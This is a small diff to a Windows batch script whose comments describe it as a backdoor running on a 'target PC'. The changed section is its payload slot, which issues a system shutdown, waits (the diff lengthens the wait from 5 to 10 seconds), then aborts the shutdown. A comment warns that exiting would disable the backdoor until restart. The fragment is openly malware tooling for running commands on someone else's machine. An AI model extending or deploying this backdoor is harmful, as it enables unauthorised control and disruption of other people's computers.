@@ -8,7 +8,7 @@ if %number% equ %update% (goto end)
 :: do not use the command exit, this will dissabled the backdoor on the target PC untill it is restarted
 :: PUT CODE IN HERE :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
 shutdown /s
-timeout 5 /NOBREAK >nul
+timeout 10 /NOBREAK >nul
 shutdown /a
 
 
